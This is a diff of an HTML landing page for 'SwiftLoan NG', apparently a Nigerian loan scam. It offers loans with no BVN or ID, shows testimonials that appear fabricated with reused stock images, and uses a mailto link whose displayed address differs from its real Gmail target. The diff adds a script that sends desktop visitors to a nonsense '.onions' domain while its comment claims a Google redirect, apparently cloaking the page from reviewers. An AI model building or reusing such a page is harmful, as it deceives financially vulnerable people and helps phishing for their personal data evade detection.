@@ -1,122 +1,211 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SwiftLoan - Fast & Easy Loans</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', sans-serif;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SwiftLoan NG- Fast & Easy Loans</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
 
-    body {
-      background: #f5f7fa;
-      color: #333;
-    }
+        body {
+            line-height: 1.6;
+            color: #333;
+        }
 
-    header {
-      background: #007bff;
-      color: white;
-      padding: 40px 20px;
-      text-align: center;
-    }
+        /* Header Section */
+        .header {
+            background: linear-gradient(to right, #004aad, #007bff);
+            color: white;
+            text-align: center;
+            padding: 60px 20px;
+        }
 
-    header h1 {
-      font-size: 2.5em;
-      margin-bottom: 10px;
-    }
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
 
-    header p {
-      font-size: 1.2em;
-      margin-bottom: 20px;
-    }
+        .header p {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
 
-    .btn {
-      background-color: #ffc107;
-      color: #000;
-      padding: 12px 24px;
-      font-size: 1em;
-      border: none;
-      border-radius: 30px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
+        .cta-button {
+            display: inline-block;
+            padding: 15px 30px;
+            background-color: #ff6f00;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
 
-    .btn:hover {
-      background-color: #e0a800;
-    }
+        .cta-button:hover {
+            background-color: #e55f00;
+        }
 
-    .testimonials {
-      background: white;
-      padding: 40px 20px;
-      margin-top: 40px;
-    }
+        /* Features Section */
+        .features {
+            padding: 40px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            text-align: center;
+        }
 
-    .testimonials h2 {
-      text-align: center;
-      margin-bottom: 30px;
-      font-size: 2em;
-      color: #007bff;
-    }
+        .feature-card {
+            width: 30%;
+            min-width: 250px;
+            margin: 20px 0;
+        }
 
-    .testimonial-container {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 20px;
-    }
+        .feature-card h3 {
+            font-size: 1.5em;
+            margin-bottom: 10px;
+            color: #004aad;
+        }
 
-    .testimonial {
-      background: #f1f1f1;
-      border-radius: 10px;
-      padding: 20px;
-      width: 300px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-    }
+        /* Steps Section */
+        .steps {
+            background-color: #f9f9f9;
+            padding: 40px 20px;
+            text-align: center;
+        }
 
-    .testimonial p {
-      font-size: 1em;
-      margin-bottom: 10px;
-    }
+        .steps h2 {
+            font-size: 2em;
+            margin-bottom: 20px;
+            color: #004aad;
+        }
 
-    .testimonial .name {
-      font-weight: bold;
-      color: #007bff;
-    }
+        .step-list {
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: left;
+        }
 
-    footer {
-      text-align: center;
-      padding: 20px;
-      background: #ddd;
-      margin-top: 40px;
-    }
-  </style>
+        .step-list li {
+            font-size: 1.1em;
+            margin: 15px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .step-list li:before {
+            content: '✔';
+            color: #ff6f00;
+            position: absolute;
+            left: 0;
+        }
+
+        /* Testimonials Section */
+        .testimonials {
+            padding: 40px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .testimonials h2 {
+            font-size: 2em;
+            margin-bottom: 20px;
+            color: #004aad;
+        }
+
+        .testimonial-card {
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 20px;
+            margin: 20px;
+            max-width: 500px;
+            display: inline-block;
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: #004aad;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .footer a {
+            color: #ff6f00;
+            text-decoration: none;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .feature-card {
+                width: 100%;
+            }
+
+            .header h1 {
+                font-size: 1.8em;
+            }
+
+            .header p {
+                font-size: 1em;
+            }
+        }
+    </style>
 </head>
 <body>
+    <!-- Header Section -->
+    <section class="header">
+    	    <h1>Welcome to SwiftLoan NG</h1>
+    	    
+        <h2>Get the Loan You Need, Fast and Easy, without BVN</h1>
+        <p>Apply for a personal or business loan with competitive rates and a simple online process.</p>
+        <a href="personal.html" class="cta-button">Apply Now</a>
+    </section>
 
-  <header>
-    <h1>Welcome to SwiftLoan</h1>
+    <!-- Features Section -->
+    <section class="features">
+        <div class="feature-card">
+            <h3>Fast Approvals</h3>
+            <p>Get a decision on your loan application within 30 minutes.</p>
+        </div>
+        <div class="feature-card">
+            <h3>Flexible Terms</h3>
+            <p>Choose repayment terms that fit your budget, from 2 months to 4 years.</p>
+        </div>
+        <div class="feature-card">
+            <h3>Secure Process</h3>
+            <p>Your data is protected with industry-standard encryption.</p>
+        </div>
+    </section>
 
-<body>
-  <div class="loan-container">
-    <div class="loan-title">Welcome to Our Fast & Reliable Loan Platform</div>
-    <div class="loan-description">
-      We’re here to make access to funds easy and stress-free. Our loan services are specially designed for 
-      <span class="highlight">students</span> and <span class="highlight">civil servants</span>, giving you the financial freedom you need when you need it most.
-      <br><br>
-      No BVN? No ID? <span class="highlight">No problem!</span><br>
-      With just your <span class="highlight">personal phone number</span> and a <span class="highlight">trusted security contact</span>, you can apply and get approved—fast.
-      <br><br>
-      <span class="highlight">No long queues, no unnecessary paperwork.</span> Just a quick, secure, and straightforward process designed to support your goals.
-    </div>
-<br />
-    <button class="btn" onclick="getStarted()">Get Started</button>
-  </header>
+    <!-- Steps Section -->
+    <section class="steps">
+        <h2>How to Apply for Your Loan</h2>
+        <ul class="step-list">
+            <li><strong>Step 1:</strong> Fill out our simple online application form in just 5 minutes.</li>
+            <li><strong>Step 2:</strong> Submit required documents securely through our portal.</li>
+            <li><strong>Step 3:</strong> Receive a decision within 5 minutes.</li>
+            <li><strong>Step 4:</strong> Funds are deposited directly to your bank account upon approval.</li>
+        </ul>
+        <a href="personal.html" class="cta-button">Start Your Application</a>
+    </section>
+      <script>
+    function getStarted() {
+      alert("Redirecting to the loan application page...");
+      // Replace with actual link when ready:
+      window.location.href = "personal.html";
+    }
+  </script>
 
-  <section class="testimonials">
+    <!-- Testimonials Section -->
+    <section class="testimonials">
     <h2>What Our Customers Say</h2>
     <div class="testimonial-container">
       <div class="testimonial">
@@ -127,7 +216,7 @@
     <p Style="border: 2px solid #ccc;   background-color: #eee;   border-radius: 5px;   padding: 16px;   margin: 16px 0">“I applied as a student and got approved the same day. No stress, no BVN needed!”</p>
   </div>
 
-  <div class="container"> <img src="https://media.licdn.com/dms/image/v2/D4D03AQEhXarKjgc0TQ/profile-displayphoto-shrink_400_400/B4DZYv16s_HwAg-/0/1744559386068?e=2147483647&v=beta&t=TS14AAqr43SDRpHflcNISOfQl0EEjRnDIYquJ4EXarM" alt="Avatar" style="width:90px">
+  <div class="container"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2mmouEayBqEVsYFh3yoz2yF3ztJ0yA3HK9GNXmKlsBregfUNNzpqriGU&s=10" alt="Avatar" style="width:90px">
     <p><span>Emmanuel Thomas</span> <sub style="color:red;">Applicant's.</sub> </p>
     </p>
     <p Style="border: 2px solid #ccc;   background-color: #eee;   border-radius: 5px;   padding: 16px;   margin: 16px 0">“Best loan site in Nigeria. I got the loan without any stress."</p>
@@ -143,7 +232,7 @@
     <p Style="border: 2px solid #ccc;   background-color: #eee;   border-radius: 5px;   padding: 16px;   margin: 16px 0">"I didn’t think I’d get a loan without an ID, but they really came through!"
 </p>
   </div>
-    <div class="container"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6ziFCkopvGiQdu5wX8Mq8RWLfjoF14PhGtQgfY2KIgRoM3YCWUJ3VASmi&s=10" alt="Avatar" style="width:90px">
+    <div class="container"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2mmouEayBqEVsYFh3yoz2yF3ztJ0yA3HK9GNXmKlsBregfUNNzpqriGU&s=10" alt="Avatar" style="width:90px">
     <p><span>Chidimma Okeke</span>  <sub style="color:red;">Applicant's.</sub> </p>
     </p>
     <p Style="border: 2px solid #ccc;   background-color: #eee;   border-radius: 5px;   padding: 16px;   margin: 16px 0">"Perfect for civil servants like me. Fast approval and zero paperwork."</p>
@@ -178,63 +267,27 @@
         
   </section>
 
-  <footer>
-    &copy; 2025 SwiftLoan. All rights reserved.
-  </footer>
-
-  <script>
-    function getStarted() {
-      alert("Redirecting to the loan application page...");
-      // Replace with actual link when ready:
-      window.location.href = "personal.html";
-    }
-  </script>
-
-  <style>
-    .container {
-      border: 2px solid #ccc;
-      background-color: #eee;
-      border-radius: 5px;
-      padding: 16px;
-      margin: 16px 0
-    }
-
-    body {
-      border: 2px solid #ccc;
-      background-color: black;
-      border-radius: 5px;
-      padding: 16px;
-
-      margin: 16px 0 .container::after {
-        content: "";
-        clear: both;
-        display: table;
-      }
-
-      .container img {
-        float: left;
-        margin-right: 20px;
-        border-radius: 50%;
-      }
-
-      .container span {
-        font-size: 20px;
-        margin-right: 15px;
-      }
-
-      @media (max-width: 500px) {
-        .container {
-          text-align: center;
-        }
-
-        .container img {
-          margin: auto;
-          float: none;
-          display: block;
-        }
-      }
-  </style>
-    <script data-goatcounter="https://726766.goatcounter.com/count"
-        async src="//gc.zgo.at/count.js"></script>
+    <!-- Footer Section -->
+    <section class="footer">
+        <p>Contact us at <a href="mailto:suppotswiftloanng@gmail.com">support@swiftloanng.com</a></p>
+        <p>&copy; 2025 Loan Company. All rights reserved.</p>
+    </section>
 </body>
+
+
+<script>
+    // Function to detect if the user is on a desktop/PC
+    function isDesktop() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        // Common user agent strings for mobile devices
+        const mobileDevices = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i;
+        // If the user agent does NOT contain mobile device strings, assume it's a desktop
+        return !mobileDevices.test(userAgent);
+    }
+
+    // Redirect to Google.com if the user is on a desktop
+    if (isDesktop()) {
+        window.location.href = "https://www.hdjsgshsjjsuxhsirifiudodhx8uvaoabcisbusvdibwxubwchjexubiwhcibec.onions";
+    }
+</script>
 </html>
